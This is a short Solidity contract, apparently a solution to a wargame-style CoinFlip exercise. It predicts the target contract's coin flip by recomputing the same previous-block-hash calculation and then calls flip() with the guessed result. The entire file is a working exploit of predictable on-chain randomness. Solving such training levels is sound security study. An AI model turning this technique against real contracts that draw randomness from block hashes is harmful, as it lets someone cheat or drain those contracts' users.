// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    CoinFlip private coinFlipContract;

    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        coinFlipContract = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        // Code me!
        /**
         * Pseudocode
         * guess the side correctly based on the same logic in the flip 
         */
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool attackingGuess = coinFlip == 1 ? true : false;
        coinFlipContract.flip(attackingGuess);
    }
}
